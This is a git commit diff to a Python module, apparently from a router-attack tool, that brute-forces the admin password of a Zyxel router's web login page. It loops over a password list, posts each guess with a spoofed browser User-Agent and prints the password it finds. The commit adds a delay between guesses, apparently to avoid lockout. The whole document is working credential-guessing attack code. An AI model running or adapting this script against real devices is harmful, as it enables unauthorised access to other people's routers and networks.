a9f3b4bde3bbc22470e548ef9b844fa88e4f342d
Semih Özdemir <66450395+zyr1on@users.noreply.github.com>
2023-04-20 00:11:57 +0300

    Update zyxel.py

--- routerModules/zyxel.py
+++ routerModules/zyxel.py
@@ -1,5 +1,5 @@
 import requests
-
+from time import sleep
 def exec(passlist):
     url = "http://192.168.1.1:80/login/login-page.cgi"
     headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36"}
@@ -7,6 +7,7 @@ def exec(passlist):
         pass_ = line.strip("\n")
         data = {"AuthName": "admin", "AuthPassword": pass_}
         req = requests.post(url,headers=headers,data=data)
+        sleep(0.25)
         print("[*] Trying",pass_, req.status_code)
         if not 'error' in req.text:
             print("\n[+] Found ->",pass_)
